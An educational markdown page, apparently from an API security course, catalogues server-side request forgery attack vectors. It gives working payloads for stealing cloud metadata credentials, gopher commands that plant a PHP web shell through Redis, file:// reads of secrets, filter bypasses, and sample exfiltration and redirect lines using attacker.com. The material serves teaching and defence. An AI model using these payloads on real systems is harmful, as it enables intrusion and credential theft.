# API07: Server Side Request Forgery - Attack Vectors

## Table of Contents
- [Understanding SSRF Attack Vectors](#understanding-ssrf-attack-vectors)
- [Common Attack Patterns](#common-attack-patterns)
- [Cloud Metadata Exploitation](#cloud-metadata-exploitation)
- [Internal Network Access](#internal-network-access)
- [SSRF Bypass Techniques](#ssrf-bypass-techniques)

## Understanding SSRF Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY**

SSRF exploits occur when attackers can control URLs that servers fetch, allowing them to:
- Access internal services not exposed to the internet
- Read cloud metadata containing credentials
- Scan internal networks
- Access file systems
- Bypass firewalls and access controls

### Core Attack Flow

```
1. Discover URL Input
   ↓
   Find parameters accepting URLs (webhooks, imports, images)

2. Test for SSRF
   ↓
   Submit internal URLs (localhost, 169.254.169.254)
   
3. Exploit
   ↓
   Access metadata, internal services, files
   
4. Escalate
   ↓
   Use stolen credentials for further access
```

## Common Attack Patterns

### 1. AWS Metadata Service Exploitation

**Target**: http://169.254.169.254/latest/meta-data/

**Attack Flow**:
```
1. Test basic access:
   http://169.254.169.254/latest/meta-data/

2. Enumerate IAM roles:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/

3. Extract credentials:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
   
4. Response contains:
   - AccessKeyId
   - SecretAccessKey
   - Token
```

**Real Attack Example**:
```http
POST /api/import-data
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

Response: ["ec2-role-name"]

POST /api/import-data
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"
}

Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

### 2. Azure Metadata Exploitation

**Target**: http://169.254.169.254/metadata/instance?api-version=2021-02-01

**Required Header**: `Metadata: true`

**Attack**:
```http
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

Response:
{
  "access_token": "eyJ0eXAi...",
  "expires_in": "3599",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

### 3. GCP Metadata Exploitation

**Target**: http://metadata.google.internal/computeMetadata/v1/

**Required Header**: `Metadata-Flavor: Google`

**Attack Endpoints**:
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

### 4. Internal Service Scanning

**Port Scanning**:
```
http://192.168.1.1:22    (SSH)
http://192.168.1.1:3306  (MySQL)
http://192.168.1.1:6379  (Redis)
http://192.168.1.1:8080  (Jenkins)
http://192.168.1.1:9200  (Elasticsearch)
```

**Service Enumeration**:
- Test common ports
- Identify running services
- Find admin interfaces
- Locate databases

### 5. Redis Exploitation via SSRF

**Attack**:
```
http://localhost:6379/
```

**Commands via URL**:
Using gopher protocol:
```
gopher://localhost:6379/_SET%20admin%20true
gopher://localhost:6379/_CONFIG%20SET%20dir%20/var/www/html
gopher://localhost:6379/_CONFIG%20SET%20dbfilename%20shell.php
gopher://localhost:6379/_SET%20payload%20"<?php%20system($_GET['cmd']);%20?>"
gopher://localhost:6379/_SAVE
```

### 6. File System Access

**File Protocol**:
```
file:///etc/passwd
file:///proc/self/environ
file:///var/www/html/config.php
file://C:/Windows/win.ini
```

**Sensitive Files**:
- `/etc/passwd`, `/etc/shadow`
- `/proc/self/environ` (environment variables)
- `~/.ssh/id_rsa` (SSH keys)
- `/var/www/html/.env` (application secrets)
- `C:/inetpub/wwwroot/web.config`

### 7. Webhook Abuse

**Attack**:
```http
POST /api/webhook/register
{
  "callback_url": "http://internal-admin:8080/api/delete-all-data"
}
```

**Impact**:
- Trigger internal actions
- CSRF on internal systems
- Data manipulation
- Service disruption

### 8. PDF/HTML Rendering SSRF

**Attack**:
```http
POST /api/generate-pdf
{
  "html": "<img src='http://169.254.169.254/latest/meta-data/'>"
}
```

**Also works with**:
- `<iframe>`
- `<object>`
- `<embed>`
- `<link rel='stylesheet'>`
- `<script src=''>`

### 9. XML External Entity (XXE) to SSRF

**Attack**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <data>&xxe;</data>
</root>
```

### 10. DNS Rebinding Attack

**Technique**: Change DNS resolution mid-request

**Attack Flow**:
1. Create domain: attacker.com
2. Initial DNS lookup: Returns 1.2.3.4 (public IP) - passes validation
3. After validation, DNS changes to: 169.254.169.254
4. Server fetches from metadata service

### 11. URL Redirect Chains

**Bypass IP blacklists**:
```
https://attacker.com/redirect
  ↓ (301 redirect)
http://169.254.169.254/latest/meta-data/
```

**Server follows redirect without re-validating destination**

### 12. IP Address Obfuscation

**Bypass Techniques**:
```
Decimal: http://2852039166/        (169.254.169.254)
Octal:   http://0251.0376.0251.0376/
Hex:     http://0xa9.0xfe.0xa9.0xfe/
Mixed:   http://0xa9.254.169.254/
Short:   http://169.254.169.254 → http://169.254.43518
IPv6:    http://[::ffff:a9fe:a9fe]/
```

### 13. CRLF Injection in URLs

**Inject headers**:
```
http://example.com%0d%0aHost:%20169.254.169.254%0d%0a
```

**Result**: Override Host header to target metadata

### 14. Time-Based Blind SSRF

**Detection when response not returned**:
```python
# Test if server can reach target
url1 = "http://169.254.169.254/"  # Fast response if accessible
url2 = "http://192.168.1.1:12345/"  # Timeout if not accessible

# Measure response time to detect accessibility
```

### 15. Cloud Storage Access

**AWS S3**:
```
http://s3.amazonaws.com/internal-bucket/secrets.txt
http://internal-bucket.s3.amazonaws.com/config.json
```

**Azure Blob**:
```
http://storageaccount.blob.core.windows.net/container/secret.txt
```

### 16. Service Account Token Theft

**Kubernetes**:
```
http://localhost:10255/metrics
http://localhost:10255/pods
file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

**Docker**:
```
http://localhost:2375/containers/json
http://localhost:2375/images/json
```

### 17. LDAP/SMTP/FTP via SSRF

**LDAP Injection**:
```
ldap://localhost:389/dc=example,dc=com
```

**SMTP Enumeration**:
```
smtp://localhost:25/
```

**FTP Data Exfiltration**:
```
ftp://attacker.com:21/
```

### 18. WebSocket SSRF

**Attack**:
```javascript
ws://internal-service:8080/websocket
```

### 19. Localhost Variations

**Bypass localhost blocks**:
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://[::]
http://127.1/
http://127.0.1/
http://2130706433/  (decimal)
```

### 20. Server-Side Include (SSI) SSRF

**Attack**:
```html
<!--#include virtual="http://169.254.169.254/latest/meta-data/" -->
```

## SSRF Bypass Techniques

### URL Parser Confusion

**Exploit differences in URL parsing**:
```
http://attacker.com@169.254.169.254/
http://169.254.169.254#@attacker.com/
http://169.254.169.254%00.attacker.com/
```

### Protocol Smuggling

**Mix protocols**:
```
http://localhost:11211/set%20test%200%200%205%0d%0aABCDE  (Memcached)
dict://localhost:6379/INFO  (Redis)
gopher://localhost:3306/... (MySQL)
```

### Charset Encoding

**Unicode characters**:
```
http://169.254.169.254/    (normal)
http://①⑥⑨.②⑤④.①⑥⑨.②⑤④/  (unicode)
```

## Cloud Provider-Specific Attacks

### AWS

**IMDSv1 (easy to exploit)**:
```
http://169.254.169.254/latest/meta-data/
```

**IMDSv2 (requires token)**:
```
1. Get token:
   PUT http://169.254.169.254/latest/api/token
   X-aws-ec2-metadata-token-ttl-seconds: 21600
   
2. Use token:
   GET http://169.254.169.254/latest/meta-data/
   X-aws-ec2-metadata-token: [TOKEN]
```

### Azure

**Requires Metadata header**:
```
GET http://169.254.169.254/metadata/instance?api-version=2021-02-01
Metadata: true
```

**Bypass**: Some vulnerable apps copy headers from user requests

### GCP

**Requires Metadata-Flavor header**:
```
GET http://metadata.google.internal/computeMetadata/v1/
Metadata-Flavor: Google
```

## Key Takeaways

1. **SSRF allows server-side requests to anywhere** attacker specifies
2. **Cloud metadata is #1 target** - contains powerful credentials
3. **Many bypass techniques exist** - simple blacklists insufficient
4. **Protocol diversity** - not just HTTP (gopher, file, dict, etc.)
5. **Chain with other vulns** - XXE, open redirects, CRLF injection
6. **Time-based detection** - even without visible response
7. **Internal network access** - bypass firewalls and network segmentation

## Next Steps

- **[Prevention Guide](prevention.md)**: Learn comprehensive SSRF defenses
- **[Code Examples](examples.md)**: See secure implementations
- **[Hands-On Lab](lab/api07-ssrf-lab/)**: Practice SSRF exploitation and prevention
